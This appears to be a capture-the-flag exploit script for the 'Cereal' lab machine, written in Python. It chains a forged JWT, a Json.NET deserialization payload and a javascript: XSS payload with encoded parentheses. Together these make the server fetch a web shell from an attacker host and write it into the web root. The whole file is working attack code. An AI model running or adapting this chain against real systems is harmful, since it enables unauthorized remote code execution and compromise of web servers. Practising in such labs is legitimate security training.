import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


webshell_url = 'http://10.10.14.2/iamf.aspx'
target_url = 'https://cereal.htb/requests'
token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM'

# Set authentication header
auth_header = {
	'Authorization': f'Bearer {token}'
}

# Serialized Cereal.DownloadHelper 
# Insert serialized object to cereal.db
# Send it via cereal request.
# Input validation is on the client side, 
# so the app willl just store this in serialized form
# (RequestsController.cs line 16-31)
serial_payload = {
	"json": '{"$type":"Cereal.DownloadHelper, Cereal","URL":"'+webshell_url+'","FilePath":"C:/inetpub/source/uploads/iamf.aspx"}'
	}

xss_req1 = requests.post(target_url, headers=auth_header, json=serial_payload, verify=False)

if xss_req1.status_code != 200:
	print('[-] Bad request')
	print(xss_req1.text)
	sys.exit(-1)

print("[+] Serialized object sent")
request_id = xss_req1.json()['id']

print(f"[+] Triggering request at {target_url}/{request_id} with XSS")

# Triggers GET request /request/{id} via another XSS, 
# The request handled by RequestsController.cs line 35-51

# https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any
# superflous encode
xhr = f'''
<script>
r = new XMLHttpRequest;
r.open%28%22GET%22, %22{target_url}/{request_id}%22, false%29;
r.setRequestHeader%28%22Authorization%22, %22Bearer {token}%22%29;
r.send%28%29;
</script>
'''.replace("\n", "")

trigger_payload = {
	"json": f'{{"title":"[XSS](javascript: document.write`{xhr}`)","flavor":"bacon","color":"#FFF","description":"test"}}'
}

xss_req2 = requests.post(target_url, headers=auth_header, json=trigger_payload, verify=False)

if xss_req2.status_code != 200:
	print("[-] Bad request ")

print(xss_req2.text)